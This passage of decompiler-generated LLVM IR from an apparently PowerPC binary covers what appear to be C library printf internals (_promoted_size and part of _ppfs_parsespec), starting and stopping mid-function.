  %v2_10009670 = icmp ugt i8 %v3_1000966c, 8
  store i1 %v2_10009670, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1000966c, 7
  br i1 %tmp26, label %dec_label_pc_10009690, label %dec_label_pc_10009678

dec_label_pc_10009678:                            ; preds = %dec_label_pc_1000966c
  %v1_10009678 = add i32 %v2_10009688, 84
  %v2_10009678 = inttoptr i32 %v1_10009678 to i32*
  %v3_10009678 = load i32, i32* %v2_10009678, align 4
  %v1_1000967c = mul nuw nsw i32 %v4_1000966c, 4
  %v2_10009680 = add i32 %v3_10009678, %v1_1000967c
  store i32 %v2_10009680, i32* %r9.global-to-local, align 4
  %v1_10009684 = add nuw nsw i32 %v4_1000966c, 1
  store i32 %v1_10009684, i32* %r0.global-to-local, align 4
  %v1_10009688 = trunc i32 %v1_10009684 to i8
  store i8 %v1_10009688, i8* %v2_1000966c, align 1
  br label %dec_label_pc_1000969c

dec_label_pc_10009690:                            ; preds = %dec_label_pc_1000966c
  %v1_10009690 = add i32 %v2_10009688, 80
  %v2_10009690 = inttoptr i32 %v1_10009690 to i32*
  %v3_10009690 = load i32, i32* %v2_10009690, align 4
  store i32 %v3_10009690, i32* %r9.global-to-local, align 4
  %v1_10009694 = add i32 %v3_10009690, 4
  store i32 %v1_10009694, i32* %r0.global-to-local, align 4
  store i32 %v1_10009694, i32* %v2_10009690, align 4
  br label %dec_label_pc_1000969c

dec_label_pc_1000969c:                            ; preds = %dec_label_pc_10009678, %dec_label_pc_10009690
  %v0_1000969c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000969c = inttoptr i32 %v0_1000969c to i32*
  %v2_1000969c = load i32, i32* %v1_1000969c, align 4
  store i32 %v2_1000969c, i32* %r0.global-to-local, align 4
  %v1_100096a0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100096a0 = inttoptr i32 %v1_100096a0 to i32*
  store i32 %v2_1000969c, i32* %v2_100096a0, align 4
  br label %dec_label_pc_100096a4

dec_label_pc_100096a4:                            ; preds = %dec_label_pc_1000964c, %dec_label_pc_10009630, %dec_label_pc_1000960c, %dec_label_pc_1000969c
  %v0_100096a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_100096a4 = add i32 %v0_100096a4, 8
  store i32 %v1_100096a4, i32* %r8.global-to-local, align 4
  %v0_100096a8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_100096ac.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100096a8

dec_label_pc_100096a8:                            ; preds = %dec_label_pc_10009574, %dec_label_pc_100096a4
  %v0_100096ac = phi i32 [ %v2_10009688, %dec_label_pc_10009574 ], [ %v0_100096ac.pre, %dec_label_pc_100096a4 ]
  %v0_100096a8 = phi i32 [ %v0_10009574, %dec_label_pc_10009574 ], [ %v0_100096a8.pre, %dec_label_pc_100096a4 ]
  %v1_100096a8 = add i32 %v0_100096a8, 1
  store i32 %v1_100096a8, i32* %r7.global-to-local, align 4
  %v1_100096ac = add i32 %v0_100096ac, 28
  %v2_100096ac = inttoptr i32 %v1_100096ac to i32*
  %v3_100096ac = load i32, i32* %v2_100096ac, align 4
  store i32 %v3_100096ac, i32* %r0.global-to-local, align 4
  %v2_100096b0 = icmp slt i32 %v1_100096a8, %v3_100096ac
  %v3_100096b0 = icmp sgt i32 %v1_100096a8, %v3_100096ac
  store i1 %v3_100096b0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100096b0, label %dec_label_pc_10009574, label %dec_label_pc_100096fc

dec_label_pc_100096bc:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_100096c0 = icmp ne i32 %v3_100094c4, -2147483648
  %v4_100096c0 = icmp eq i32 %v3_100094c4, -2147483648
  store i1 %v3_100096c0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_100096c0, label %dec_label_pc_100096c8, label %dec_label_pc_100096dc

dec_label_pc_100096c8:                            ; preds = %dec_label_pc_100096bc
  %v1_100096c8 = add i32 %v0_100094bc, 36
  %v2_100096c8 = inttoptr i32 %v1_100096c8 to i8*
  %v3_100096c8 = load i8, i8* %v2_100096c8, align 1
  %v4_100096c8 = zext i8 %v3_100096c8 to i32
  %v1_100096cc = mul nuw nsw i32 %v4_100096c8, 8
  %v2_100096d0 = add i32 %v1_100096cc, %v1_100094c0
  store i32 %v2_100096d0, i32* %r9.global-to-local, align 4
  %v1_100096d4 = add i32 %v2_100096d0, -8
  %v2_100096d4 = inttoptr i32 %v1_100096d4 to i32*
  %v3_100096d4 = load i32, i32* %v2_100096d4, align 4
  store i32 %v3_100096d4, i32* %r0.global-to-local, align 4
  store i32 %v3_100096d4, i32* %v2_100094c4, align 4
  %v0_100096dc.pre = load i32, i32* @r3, align 4
  %v1_100096e0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100096dc

dec_label_pc_100096dc:                            ; preds = %dec_label_pc_100096bc, %dec_label_pc_100096c8
  %v1_100096e0 = phi i32 [ -2147483648, %dec_label_pc_100096bc ], [ %v1_100096e0.pre, %dec_label_pc_100096c8 ]
  %v1_100096f8 = phi i32 [ %v0_100094bc, %dec_label_pc_100096bc ], [ %v0_100096dc.pre, %dec_label_pc_100096c8 ]
  %v1_100096dc = add i32 %v1_100096f8, 4
  %v2_100096dc = inttoptr i32 %v1_100096dc to i32*
  %v3_100096dc = load i32, i32* %v2_100096dc, align 4
  store i32 %v3_100096dc, i32* %r0.global-to-local, align 4
  %v3_100096e0 = icmp sgt i32 %v3_100096dc, %v1_100096e0
  %v4_100096e0 = icmp eq i32 %v3_100096dc, %v1_100096e0
  store i1 %v3_100096e0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_100096e0, label %dec_label_pc_100096e8, label %dec_label_pc_100096fc

dec_label_pc_100096e8:                            ; preds = %dec_label_pc_100096dc
  %v1_100096e8 = add i32 %v1_100096f8, 37
  %v2_100096e8 = inttoptr i32 %v1_100096e8 to i8*
  %v3_100096e8 = load i8, i8* %v2_100096e8, align 1
  %v4_100096e8 = zext i8 %v3_100096e8 to i32
  %v1_100096ec = mul nuw nsw i32 %v4_100096e8, 8
  %v1_100096f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100096f0 = add i32 %v1_100096ec, %v1_100096f0
  store i32 %v2_100096f0, i32* %r9.global-to-local, align 4
  %v1_100096f4 = add i32 %v2_100096f0, -8
  %v2_100096f4 = inttoptr i32 %v1_100096f4 to i32*
  %v3_100096f4 = load i32, i32* %v2_100096f4, align 4
  store i32 %v3_100096f4, i32* %r0.global-to-local, align 4
  store i32 %v3_100096f4, i32* %v2_100096dc, align 4
  %v0_100096fc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100096fc

dec_label_pc_100096fc:                            ; preds = %dec_label_pc_100096a8, %dec_label_pc_100096ac.preheader, %dec_label_pc_100096dc, %dec_label_pc_100096e8
  %v0_100096fc = phi i32 [ %v1_100096f8, %dec_label_pc_100096dc ], [ %v0_100096fc.pre, %dec_label_pc_100096e8 ], [ %v0_100096ac5, %dec_label_pc_100096ac.preheader ], [ %v0_100096ac, %dec_label_pc_100096a8 ]
  %v1_100096fc = add i32 %v0_100096fc, 8
  %v2_100096fc = inttoptr i32 %v1_100096fc to i32*
  %v3_100096fc = load i32, i32* %v2_100096fc, align 4
  store i32 %v3_100096fc, i32* %r11.global-to-local, align 4
  %v2_10009700 = icmp sgt i32 %v3_100096fc, 0
  store i1 %v2_10009700, i1* %cr7_gt.global-to-local, align 1
  %v0_10009704 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_100096fc, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_10009704)
  %v0_10009708 = load i32, i32* @r3, align 4
  %v1_10009708 = add i32 %v0_10009708, 16
  %v2_10009708 = inttoptr i32 %v1_10009708 to i32*
  %v3_10009708 = load i32, i32* %v2_10009708, align 4
  store i32 %v3_10009708, i32* %r0.global-to-local, align 4
  %v0_1000970c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000970c = sub i32 0, %v0_1000970c
  store i32 %v1_1000970c, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_10009714 = add i32 %v0_10009708, 8
  %v3_10009714 = inttoptr i32 %v2_10009714 to i32*
  store i32 %v1_1000970c, i32* %v3_10009714, align 4
  %v0_10009718 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009718 = or i32 %v0_10009718, 8
  store i32 %v1_10009718, i32* %r0.global-to-local, align 4
  %v0_1000971c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000971c = load i32, i32* @r3, align 4
  %v2_1000971c = add i32 %v1_1000971c, 20
  %v3_1000971c = inttoptr i32 %v2_1000971c to i32*
  store i32 %v0_1000971c, i32* %v3_1000971c, align 4
  %v1_10009720 = call i32 @__asm_rlwinm(i32 %v1_10009718, i32 0, i32 0, i32 30)
  store i32 %v1_10009720, i32* %r0.global-to-local, align 4
  %v1_10009724 = load i32, i32* @r3, align 4
  %v2_10009724 = add i32 %v1_10009724, 16
  %v3_10009724 = inttoptr i32 %v2_10009724 to i32*
  store i32 %v1_10009720, i32* %v3_10009724, align 4
  %v0_10009728 = load i32, i32* @r3, align 4
  ret i32 %v0_10009728

; uselistorder directives
  uselistorder i32 %v3_100096dc, { 1, 0, 2 }
  uselistorder i32 %v1_100096e0, { 1, 0 }
  uselistorder i32 %v3_100096ac, { 1, 0, 2 }
  uselistorder i32 %v1_100096a8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_100096ac, { 0, 2, 1 }
  uselistorder i32 %v4_10009624, { 1, 0, 2 }
  uselistorder i32 %v1_100095e4, { 1, 0 }
  uselistorder i32 %v1_100095dc, { 2, 0, 1 }
  uselistorder i32 %v1_10009588, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000957c, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_10009574, { 1, 0 }
  uselistorder i32 %v2_10009688, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_100096ac5, { 1, 0, 2 }
  uselistorder i32 %v3_1000951c, { 1, 0, 2 }
  uselistorder i32 %v2_1000954c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_100094c4, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_100094bc, { 1, 0, 2 }
  uselistorder i32 %v0_100094bc, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 17, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 29, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_gt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 19, 17, 7, 8, 9, 10, 18, 12, 13, 14, 15, 16 }
  uselistorder i32 7, { 2, 3, 4, 5, 0, 1, 6, 7 }
  uselistorder i32 80, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_100096fc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100096dc, { 1, 0 }
  uselistorder label %dec_label_pc_100096a8, { 1, 0 }
  uselistorder label %dec_label_pc_100096a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000969c, { 1, 0 }
  uselistorder label %dec_label_pc_1000966c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10009620, { 1, 0 }
  uselistorder label %dec_label_pc_1000960c, { 1, 0 }
  uselistorder label %dec_label_pc_10009574, { 1, 0 }
  uselistorder label %dec_label_pc_100096ac.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10009560, { 1, 0 }
  uselistorder label %dec_label_pc_1000951c, { 1, 0 }
  uselistorder label %dec_label_pc_10009510, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_10009738

dec_label_pc_10009738:                            ; preds = %dec_label_pc_10009738, %entry
  %v0_10009738 = phi i32 [ ptrtoint (i32* @global_var_1000eb4c.186 to i32), %entry ], [ %v1_10009738, %dec_label_pc_10009738 ]
  %v1_10009738 = add i32 %v0_10009738, -2
  %v2_10009738 = inttoptr i32 %v1_10009738 to i16*
  %v3_10009738 = load i16, i16* %v2_10009738, align 2
  %v4_10009738 = sext i16 %v3_10009738 to i32
  %v4_1000973c = icmp eq i32 %v4_10009738, %arg1
  %v3_10009740.not = icmp ule i32 %v1_10009738, ptrtoint (i32* @global_var_1000eb34.187 to i32)
  %brmerge = or i1 %v4_1000973c, %v3_10009740.not
  br i1 %brmerge, label %dec_label_pc_1000974c, label %dec_label_pc_10009738

dec_label_pc_1000974c:                            ; preds = %dec_label_pc_10009738
  %v2_10009754 = sub i32 %v1_10009738, ptrtoint (i32* @global_var_1000eb34.187 to i32)
  %v1_1000975c = udiv i32 %v2_10009754, 2
  %v2_1000975c = and i32 %v2_10009754, -2147483648
  %v3_1000975c = or i32 %v1_1000975c, %v2_1000975c
  %v2_10009764 = add i32 %v3_1000975c, ptrtoint (i32* @global_var_1000eb4c.186 to i32)
  %v3_10009764 = inttoptr i32 %v2_10009764 to i8*
  %v4_10009764 = load i8, i8* %v3_10009764, align 1
  %v5_10009764 = zext i8 %v4_10009764 to i32
  ret i32 %v5_10009764

; uselistorder directives
  uselistorder i32 %v2_10009754, { 1, 0 }
  uselistorder i32 %v1_10009738, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1000eb34.187 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000eb4c.186 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1000976c = load i32, i32* @lr, align 4
  store i32 %v0_1000976c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_10009784 = add i32 %tmp, 16
  %v2_10009784 = inttoptr i32 %v1_10009784 to i32*
  %v3_10009784 = load i32, i32* %v2_10009784, align 4
  %v1_1000978c = and i32 %v3_10009784, 128
  store i32 %v1_1000978c, i32* %r6.global-to-local, align 4
  %v3_1000978c = icmp eq i32 %v1_1000978c, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_100097a0 = add i32 %tmp, 24
  %v2_100097a0 = inttoptr i32 %v1_100097a0 to i32*
  %v3_100097a0 = load i32, i32* %v2_100097a0, align 4
  store i32 %v3_100097a0, i32* %r26.global-to-local, align 4
  br i1 %v3_1000978c, label %dec_label_pc_100097a8, label %dec_label_pc_100097c0

dec_label_pc_100097a8:                            ; preds = %entry
  %v2_100097a8 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_10009814

dec_label_pc_100097b8:                            ; preds = %dec_label_pc_100099e8
  %v1_100097b8 = add i32 %v0_100099b8, 1
  store i32 %v1_100097b8, i32* @r30, align 4
  br label %dec_label_pc_10009a00

dec_label_pc_100097c0:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_100097c4 = load i32, i32* %arg1, align 4
  store i32 %v2_100097c4, i32* %r8.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_100097d0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100097d0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100097d4

dec_label_pc_100097d4:                            ; preds = %dec_label_pc_10009804.dec_label_pc_100097d4_crit_edge, %dec_label_pc_100097c0
  %v0_100097dc = phi i32 [ %v0_100097dc.pre, %dec_label_pc_10009804.dec_label_pc_100097d4_crit_edge ], [ %v2_100097c4, %dec_label_pc_100097c0 ]
  %v0_100097d8 = phi i32 [ %v0_100097d8.pre, %dec_label_pc_10009804.dec_label_pc_100097d4_crit_edge ], [ %v2_100097d0, %dec_label_pc_100097c0 ]
  %v0_100097e0 = phi i32 [ %v0_100097d4.pre, %dec_label_pc_10009804.dec_label_pc_100097d4_crit_edge ], [ 0, %dec_label_pc_100097c0 ]
  %v1_100097d4 = mul i32 %v0_100097e0, 4
  %v2_100097d8 = add i32 %v0_100097e0, %v0_100097d8
  store i32 %v2_100097d8, i32* %r9.global-to-local, align 4
  %v2_100097dc = add i32 %v1_100097d4, %v0_100097dc
  store i32 %v2_100097dc, i32* %r11.global-to-local, align 4
  %v1_100097e0 = add i32 %v0_100097e0, 1
  store i32 %v1_100097e0, i32* %r10.global-to-local, align 4
  %v1_100097e4 = add i32 %v2_100097dc, -4
  %v2_100097e4 = inttoptr i32 %v1_100097e4 to i32*
  %v3_100097e4 = load i32, i32* %v2_100097e4, align 4
  store i32 %v3_100097e4, i32* %r0.global-to-local, align 4
  %v1_100097e8 = trunc i32 %v3_100097e4 to i8
  %v3_100097e8 = add i32 %v2_100097d8, 24
  %v4_100097e8 = inttoptr i32 %v3_100097e8 to i8*
  store i8 %v1_100097e8, i8* %v4_100097e8, align 1
  %v0_100097ec = load i32, i32* %r0.global-to-local, align 4
  %v1_100097ec = urem i32 %v0_100097ec, 256
  store i32 %v1_100097ec, i32* %r0.global-to-local, align 4
  %v0_100097f4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100097f4 = add i32 %v0_100097f4, -4
  %v2_100097f4 = inttoptr i32 %v1_100097f4 to i32*
  %v3_100097f4 = load i32, i32* %v2_100097f4, align 4
  store i32 %v3_100097f4, i32* %r9.global-to-local, align 4
  %v4_100097f8 = icmp eq i32 %v1_100097ec, %v3_100097f4
  br i1 %v4_100097f8, label %dec_label_pc_10009800, label %dec_label_pc_10009c70

dec_label_pc_10009800:                            ; preds = %dec_label_pc_100097d4
  %v3_100097f0 = icmp eq i32 %v1_100097ec, 0
  br i1 %v3_100097f0, label %dec_label_pc_10009808, label %dec_label_pc_10009804

dec_label_pc_10009804:                            ; preds = %dec_label_pc_10009800
  %v0_10009804 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009804 = add i32 %v0_10009804, -1
  store i32 %v1_10009804, i32* %ctr.global-to-local, align 4
  %v2_10009804 = icmp eq i32 %v1_10009804, 0
  br i1 %v2_10009804, label %dec_label_pc_10009808, label %dec_label_pc_10009804.dec_label_pc_100097d4_crit_edge

dec_label_pc_10009804.dec_label_pc_100097d4_crit_edge: ; preds = %dec_label_pc_10009804
  %v0_100097d4.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_100097d8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_100097dc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100097d4

dec_label_pc_10009808:                            ; preds = %dec_label_pc_10009804, %dec_label_pc_10009800
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000980c = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_10009814

dec_label_pc_10009814:                            ; preds = %dec_label_pc_100097a8, %dec_label_pc_10009808
  %v2_10009824.pre-phi = phi i32 [ %.pre, %dec_label_pc_100097a8 ], [ %v2_100097d0, %dec_label_pc_10009808 ]
  %storemerge3 = phi i32 [ %v2_100097a8, %dec_label_pc_100097a8 ], [ %v2_1000980c, %dec_label_pc_10009808 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 268500992, i32* %r27.global-to-local, align 4
  store i32 %v2_10009824.pre-phi, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009834

dec_label_pc_10009830:                            ; preds = %dec_label_pc_10009940, %dec_label_pc_100099c4
  %v0_10009830 = phi i32 [ %v1_100099c4, %dec_label_pc_100099c4 ], [ %v0_10009928, %dec_label_pc_10009940 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_100099c4 ], [ %stack_var_-84.2, %dec_label_pc_10009940 ]
  store i32 %v0_10009830, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009834

dec_label_pc_10009834:                            ; preds = %dec_label_pc_10009814, %dec_label_pc_10009830
  %v0_10009848 = phi i32 [ %storemerge3, %dec_label_pc_10009814 ], [ %v0_10009830, %dec_label_pc_10009830 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_10009814 ], [ %stack_var_-84.0, %dec_label_pc_10009830 ]
  %v1_10009834 = inttoptr i32 %v0_10009848 to i8*
  %v2_10009834 = load i8, i8* %v1_10009834, align 1
  %v3_10009834 = zext i8 %v2_10009834 to i32
  store i32 %v3_10009834, i32* %r0.global-to-local, align 4
  store i32 %v0_10009848, i32* @r30, align 4
  %v3_1000983c = icmp eq i8 %v2_10009834, 42
  br i1 %v3_1000983c, label %dec_label_pc_10009844, label %dec_label_pc_10009854

dec_label_pc_10009844:                            ; preds = %dec_label_pc_10009834
  %v0_10009844 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009844 = mul i32 %v0_10009844, -4
  store i32 %v1_10009844, i32* %r0.global-to-local, align 4
  %v1_10009848 = add i32 %v0_10009848, 1
  store i32 %v1_10009848, i32* @r30, align 4
  %v0_1000984c = load i32, i32* @r1, align 4
  %v2_1000984c = add i32 %v0_1000984c, %v1_10009844
  store i32 %v2_1000984c, i32* %r9.global-to-local, align 4
  %v0_10009850 = load i32, i32* @r29, align 4
  %v2_10009850 = add i32 %v2_1000984c, 8
  %v3_10009850 = inttoptr i32 %v2_10009850 to i32*
  store i32 %v0_10009850, i32* %v3_10009850, align 4
  %v0_1000986c.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009854

dec_label_pc_10009854:                            ; preds = %dec_label_pc_10009834, %dec_label_pc_10009844
  %v0_1000986c.pre = phi i32 [ %v0_10009848, %dec_label_pc_10009834 ], [ %v0_1000986c.pre.pre, %dec_label_pc_10009844 ]
  %v3_10009854 = load i32, i32* @global_var_1001fd68, align 4
  store i32 %v3_10009854, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000986c

dec_label_pc_10009860:                            ; preds = %dec_label_pc_1000986c
  %v2_10009870 = icmp sgt i32 %v0_100098b8, 4094
  br i1 %v2_10009870, label %dec_label_pc_10009868, label %dec_label_pc_10009864

dec_label_pc_10009864:                            ; preds = %dec_label_pc_10009860
  %v1_10009864 = add i32 %v2_10009884, -48
  store i32 %v1_10009864, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10009868

dec_label_pc_10009868:                            ; preds = %dec_label_pc_10009860, %dec_label_pc_10009864
  %v0_1000987015 = phi i32 [ %v0_100098b8, %dec_label_pc_10009860 ], [ %v1_10009864, %dec_label_pc_10009864 ]
  %v1_10009868 = add i32 %v0_100098e8, 1
  store i32 %v1_10009868, i32* @r30, align 4
  br label %dec_label_pc_1000986c

dec_label_pc_1000986c:                            ; preds = %dec_label_pc_10009854, %dec_label_pc_10009868
  %v0_100098b8 = phi i32 [ 0, %dec_label_pc_10009854 ], [ %v0_1000987015, %dec_label_pc_10009868 ]
  %v0_100098e8 = phi i32 [ %v0_1000986c.pre, %dec_label_pc_10009854 ], [ %v1_10009868, %dec_label_pc_10009868 ]
  %v1_1000986c = inttoptr i32 %v0_100098e8 to i8*
  %v2_1000986c = load i8, i8* %v1_1000986c, align 1
  %v3_1000986c = zext i8 %v2_1000986c to i32
  store i32 %v3_1000986c, i32* %r11.global-to-local, align 4
  %v1_10009874 = mul nuw nsw i32 %v3_1000986c, 2
  store i32 %v1_10009874, i32* %r9.global-to-local, align 4
  %v2_10009878 = add i32 %v1_10009874, %v3_10009854
  %v3_10009878 = inttoptr i32 %v2_10009878 to i16*
  %v4_10009878 = load i16, i16* %v3_10009878, align 2
  %v5_10009878 = zext i16 %v4_10009878 to i32
  store i32 %v5_10009878, i32* %r0.global-to-local, align 4
  %v1_1000987c = mul i32 %v0_100098b8, 10
  %v1_10009880 = and i32 %v5_10009878, 8
  store i32 %v1_10009880, i32* %r25.global-to-local, align 4
  %v3_10009880 = icmp eq i32 %v1_10009880, 0
  %v2_10009884 = add i32 %v3_1000986c, %v1_1000987c
  store i32 %v2_10009884, i32* %r9.global-to-local, align 4
  br i1 %v3_10009880, label %dec_label_pc_1000988c, label %dec_label_pc_10009860

dec_label_pc_1000988c:                            ; preds = %dec_label_pc_1000986c
  %v0_1000988c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000988c = add i32 %v0_1000988c, -1
  %v2_1000988c = inttoptr i32 %v1_1000988c to i8*
  %v3_1000988c = load i8, i8* %v2_1000988c, align 1
  %v4_1000988c = zext i8 %v3_1000988c to i32
  store i32 %v4_1000988c, i32* %r0.global-to-local, align 4
  %v3_10009890 = icmp eq i8 %v3_1000988c, 37
  br i1 %v3_10009890, label %dec_label_pc_10009898, label %dec_label_pc_10009960

dec_label_pc_10009898:                            ; preds = %dec_label_pc_1000988c
  %v3_10009898 = icmp eq i8 %v2_1000986c, 36
  br i1 %v3_10009898, label %dec_label_pc_100098a0, label %dec_label_pc_100098d4

dec_label_pc_100098a0:                            ; preds = %dec_label_pc_10009898
  %tmp58 = icmp slt i32 %v0_100098b8, 1
  br i1 %tmp58, label %dec_label_pc_100098d4, label %dec_label_pc_100098a8

dec_label_pc_100098a8:                            ; preds = %dec_label_pc_100098a0
  %v0_100098a8 = load i32, i32* %r26.global-to-local, align 4
  %v3_100098a8 = icmp eq i32 %v0_100098a8, 0
  %v1_100098ac = add i32 %v0_100098e8, 1
  store i32 %v1_100098ac, i32* %r10.global-to-local, align 4
  br i1 %v3_100098a8, label %dec_label_pc_10009c70, label %dec_label_pc_100098b4

dec_label_pc_100098b4:                            ; preds = %dec_label_pc_100098a8
  %v3_100098b4 = icmp sgt i32 %v0_100098b8, %v0_100098a8
  br i1 %v3_100098b4, label %dec_label_pc_100098c0, label %dec_label_pc_100098cc

dec_label_pc_100098c0:                            ; preds = %dec_label_pc_100098b4
  store i32 %v0_100098b8, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_100098cc

dec_label_pc_100098c8:                            ; preds = %dec_label_pc_100098f0, %dec_label_pc_100098e8
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_100098cc

dec_label_pc_100098cc:                            ; preds = %dec_label_pc_100098b4, %dec_label_pc_100098c0, %dec_label_pc_100098c8
  %v0_100098cc = phi i32 [ %v0_1000988c, %dec_label_pc_100098c8 ], [ %v1_100098ac, %dec_label_pc_100098c0 ], [ %v1_100098ac, %dec_label_pc_100098b4 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_100098c8 ], [ %v0_100098b8, %dec_label_pc_100098c0 ], [ %v0_100098b8, %dec_label_pc_100098b4 ]
  br label %dec_label_pc_10009908

dec_label_pc_100098d4:                            ; preds = %dec_label_pc_10009898, %dec_label_pc_100098a0
  %v0_100098d4 = load i32, i32* %r26.global-to-local, align 4
  %tmp59 = icmp slt i32 %v0_100098d4, 1
  br i1 %tmp59, label %dec_label_pc_100098e8, label %dec_label_pc_100098dc

dec_label_pc_100098dc:                            ; preds = %dec_label_pc_100098d4
  %v3_100098dc = icmp eq i8 %v2_1000986c, 109
  br i1 %v3_100098dc, label %dec_label_pc_10009960, label %dec_label_pc_10009c70

dec_label_pc_100098e8:                            ; preds = %dec_label_pc_100098d4
  %v3_100098e8 = icmp ugt i32 %v0_100098e8, %v0_1000988c
  br i1 %v3_100098e8, label %dec_label_pc_100098f0, label %dec_label_pc_100098c8

dec_label_pc_100098f0:                            ; preds = %dec_label_pc_100098e8
  %v1_100098f0 = inttoptr i32 %v0_1000988c to i8*
  %v2_100098f0 = load i8, i8* %v1_100098f0, align 1
  %v3_100098f0 = zext i8 %v2_100098f0 to i32
  store i32 %v3_100098f0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000988c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  %v3_100098fc = icmp eq i8 %v2_100098f0, 48
  br i1 %v3_100098fc, label %dec_label_pc_100098c8, label %dec_label_pc_10009964

dec_label_pc_10009908:                            ; preds = %dec_label_pc_10009924, %dec_label_pc_100098cc
